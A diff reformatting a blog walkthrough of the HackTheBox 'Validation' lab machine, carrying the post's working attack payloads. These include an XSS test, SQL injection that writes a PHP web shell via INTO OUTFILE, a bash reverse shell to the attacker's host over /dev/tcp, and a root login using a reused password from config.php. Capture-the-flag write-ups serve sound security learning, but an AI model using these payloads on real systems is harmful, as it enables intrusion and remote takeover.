@@ -1,10 +1,6 @@
----
-title: "HackTheBox Validation Walkthrough"
-date: "2022-06-16"
-categories: 
-  - "htb-walkthroughs"
-coverImage: "pexels-andri-218413-scaled.jpg"
----
+# HackTheBox Validation Walkthrough"
+
+![](images/pexels-andri-218413-scaled.jpg)
 
 I've been experimenting with Rustscan lately and it's a lot faster than NMAP.
 
@@ -32,7 +28,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
 
 We got a few ports open, 80 is the most interesting right now.
 
-[![](images/image-11-1024x490.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-11.png)
+![](images/image-11-1024x490.png)
 
 <script>alert('1')</script>
 
@@ -40,19 +36,19 @@ The WebApp is vulnerable to stored XSS as well as reflective XSS but that doesn'
 
 Intercepting the request in Burp when clicking "Join Now". We can try to see if SQLi is possible.
 
-[![](images/image-12-1024x751.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-12.png)
+![](images/image-12-1024x751.png)
 
 Adding a ' after Brazil returns an error. The Web App is likely vulnerable to a SQLi attack.
 
 You may have to copy the response cookie into the request cookie to get the error to show up.
 
-[![](images/image-14-1024x807.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-14.png)
+![](images/image-14-1024x807.png)
 
 ' union select version()-- -
 
 You will need to URL encode that line to get it to work.
 
-[![](images/image-18-1024x785.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-18.png)
+![](images/image-18-1024x785.png)
 
 The Web App returns MariaDB 10.5.11. We executed a successful SQLi attack and got some information disclosure.
 
@@ -62,13 +58,13 @@ Upon searching the net, I figured out I could upload a file using MariaDB.
 
 ' UNION SELECT "<?php SYSTEM($\_REQUEST\['cmd'\]) ?>" INTO OUTFILE "C:\\wamp64\\www\\wordpress/shell.php"-- -
 
-[![](images/image-16.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-16.png)
+![](images/image-16.png)
 
 The WebApp will return an error, however if we visit the link http://10.10.11.116/shell.php We can see that it's working.
 
 I tried to check what is in /bin to see what program I can use for the reverse shell.
 
-[![](images/image-17-1024x307.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-17.png)
+![](images/image-17-1024x307.png)
 
 bash is running, that's all I need.
 
@@ -88,13 +84,13 @@ Here is the final URL.
 
 http://10.10.11.116/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.19/9999+0>%261'
 
-[![](images/image-19.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-19.png)
+![](images/image-19.png)
 
 And we've got a shell!
 
 The next part was pretty easy. We can use python HTTP server and curl to get linpeas.sh over or we can simply look in config.php to get the password.
 
-[![](images/image-20.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-20.png)
+![](images/image-20.png)
 
 The password is for a username, but it also happens to work for root.
 
